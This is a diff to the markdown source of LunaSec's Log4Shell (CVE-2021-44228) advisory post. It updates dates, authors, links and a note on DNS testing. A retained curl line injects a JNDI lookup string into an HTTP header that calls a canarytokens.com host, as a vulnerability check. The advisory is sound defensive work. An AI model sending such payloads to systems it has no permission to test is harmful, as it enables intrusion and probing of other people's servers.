@@ -3,6 +3,7 @@ title: "Log4Shell: RCE 0-day exploit found in log4j 2, a popular Java logging pa
 description: Given how ubiquitous log4j is, the impact of this vulnerability is quite severe. Learn how to patch it, why it's bad, and more in this post.
 slug: log4j-zero-day
 image: https://www.lunasec.io/docs/img/log4shell-logo.png
+date: 2021-12-12
 authors:
 - name: Free Wortley
   title: CEO at LunaSec
@@ -13,6 +14,10 @@ authors:
   title: Developer at Lunasec
   url: https://github.com/breadchris
   image_url: https://github.com/breadchris.png
+- name: Forrest Allison
+  title: Developer at LunaSec
+  url: https://github.com/factoidforrest
+  image_url: https://github.com/factoidforrest.png
 
 ---
 <!--
@@ -31,7 +36,7 @@ authors:
 
 ![Log4Shell Logo](https://www.lunasec.io/docs/img/log4shell-logo.png)
 
-_Updated @ December 11th, 7:30pm PST_
+_Updated @ December 12th, 11:30pm PST_
 
 _This blog post is also available at https://log4shell.com/_
 
@@ -43,8 +48,7 @@ Given how ubiquitous this library is, the impact of the exploit (full server con
 the impact of this vulnerability is quite severe. We're calling it "Log4Shell" for short.
 
 The 0-day was [tweeted](https://twitter.com/P0rZ9/status/1468949890571337731) along with a POC posted on
-[GitHub](https://github.com/tangxiaofeng7/apache-log4j-poc).  ~~Since this vulnerability is still very new, there isn't a CVE to track
-it yet.~~ This has been published as [CVE-2021-44228](https://www.randori.com/blog/cve-2021-44228/).
+[GitHub](https://github.com/tangxiaofeng7/apache-log4j-poc).  It has now been published as [CVE-2021-44228](https://www.randori.com/blog/cve-2021-44228/).
 
 This post provides resources to help you understand the vulnerability and how to mitigate it for yourself.
 
@@ -54,6 +58,8 @@ This post provides resources to help you understand the vulnerability and how to
 
 Many, many services are vulnerable to this exploit.  Cloud services like [Steam, Apple iCloud](https://news.ycombinator.com/item?id=29499867), and apps like
 Minecraft have already been found to be vulnerable.
+
+An extensive list of responses from impacted organizations has been compiled [here](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592).
 
 Anybody using Apache Struts is likely vulnerable. We've seen similar vulnerabilities exploited before in breaches like
 the [2017 Equifax data breach](https://en.wikipedia.org/wiki/2017_Equifax_data_breach#Data_breach).
@@ -197,7 +203,7 @@ input to an HTTP header.  In our example above, the User-Agent header was being 
 curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://x${hostName}.L4J.<RANDOM_STRING>.canarytokens.com/a}'
 ```
 
-:::caution
+:::info These requests may not be private
 If you wish to test more discretely, you may [setup your own authoritative DNS server](https://www.joshmcguigan.com/blog/run-your-own-dns-servers/)
 for testing.
 :::
@@ -239,6 +245,7 @@ methods are still prevalent.
 8. Update social info.
 9. Updated example code to use Log4j2 syntax.
 10. Update title because of some confusion.
+11. Better DNS testing site and explanation
 
 ### References
 
